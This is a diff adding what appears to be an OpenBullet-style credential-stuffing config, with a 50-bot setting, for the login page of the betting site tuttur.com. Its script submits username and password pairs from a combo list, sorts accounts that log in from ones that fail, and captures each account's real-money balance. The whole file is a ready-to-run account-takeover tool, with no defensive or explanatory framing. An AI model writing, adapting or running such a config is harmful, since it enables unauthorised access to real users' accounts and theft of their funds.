@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Tuttur.com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-28T17:23:50.852539+03:00",
+  "AdditionalInfo": "www.siberdeyiz.com",
+  "Author": "By_Num",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Giriş REQUEST POST "https://www.tuttur.com/user/login" ParseQuery=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&response=&_token=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "no" 
+  KEYCHAIN Failure OR 
+    KEY "web sunucu" 
+
+PARSE "<SOURCE>" LR "topPlayerRealMoneyBalanceContainer\">" "</b>" -> CAP "BAKİYENİZ ::" 
+
